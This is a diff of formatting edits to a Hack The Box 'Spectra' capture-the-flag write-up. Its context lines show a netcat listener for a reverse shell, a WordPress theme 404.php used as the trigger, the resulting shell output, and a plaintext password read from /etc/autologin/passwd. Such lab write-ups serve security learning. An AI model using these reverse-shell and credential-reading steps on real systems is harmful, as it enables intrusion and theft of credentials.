@@ -142,7 +142,6 @@ wp-settings.php                                    10-Apr-2020 03:59            
 wp-signup.php                                      06-Feb-2020 06:33               31111
 wp-trackback.php                                   06-Feb-2020 06:33                4755
 xmlrpc.php                                         06-Feb-2020 06:33                3133
-
 ```
 
 Download the files locally
@@ -324,11 +323,11 @@ rlwrap nc -nvlp 1234
 
 # Open
 # http://spectra.htb/main/wp-content/themes/twentynineteen/404.php
-
-# Got Reverse shell
 ```
 
 ```bash
+# Got Reverse shell
+
 connect to [10.10.14.5] from (UNKNOWN) [10.129.240.86] 37162
 Linux spectra 5.4.66+ #1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7513 32-Core Processor AuthenticAMD GNU/Linux
  07:21:57 up 8 min,  0 users,  load average: 0.01, 0.13, 0.09
@@ -414,11 +413,11 @@ end script
 ```bash
 find / -type f -iname passwd 2>/dev/null
 
-    /usr/share/baselayout/passwd
-    /usr/bin/passwd
-    /etc/passwd
-    /etc/autologin/passwd
-    /etc/pam.d/passwd
+/usr/share/baselayout/passwd
+/usr/bin/passwd
+/etc/passwd
+/etc/autologin/passwd
+/etc/pam.d/passwd
 
 cat /etc/autologin/passwd
 SummerHereWeCome!!
@@ -579,7 +578,7 @@ done
 
 ## Extra
 
-- https://0xdf.gitlab.io/2021/06/26/htb-spectra.html
+- [https://0xdf.gitlab.io/2021/06/26/htb-spectra.html](https://0xdf.gitlab.io/2021/06/26/htb-spectra.html)
 
 ------
 
